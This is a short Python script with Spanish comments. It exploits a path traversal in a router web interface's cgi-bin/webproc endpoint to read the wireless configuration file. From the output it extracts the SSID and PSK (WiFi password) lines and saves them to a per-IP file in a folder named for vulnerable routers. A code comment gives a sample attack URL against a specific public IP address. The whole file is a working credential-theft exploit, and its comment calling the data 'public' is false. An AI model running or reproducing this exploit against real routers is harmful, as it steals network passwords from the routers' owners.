import urllib

def get_router_data(ip):
    # Leer datos publicos router
    # example
    # http://201.246.1.12:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../var/config/wlan0.conf&var:menu=advanced&var:page=dns
    read_buffer = urllib.urlopen("http://{0}:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../var/config/wlan0.conf&var:menu=advanced&var:page=dns".format(ip))
    raw_data = read_buffer.read()
    data_array = raw_data.split('\n')
    
    # Crear archivo respectivo
    archivo = open('routers_vulnerables/{0}.txt'.format(ip),"w")
    # Procesar data_array
    for data in data_array:
        if(data.startswith('ssid') or data.startswith('psk')):
            archivo.write(data+'\n')
            
    # Cerrar buffer
    read_buffer.close()




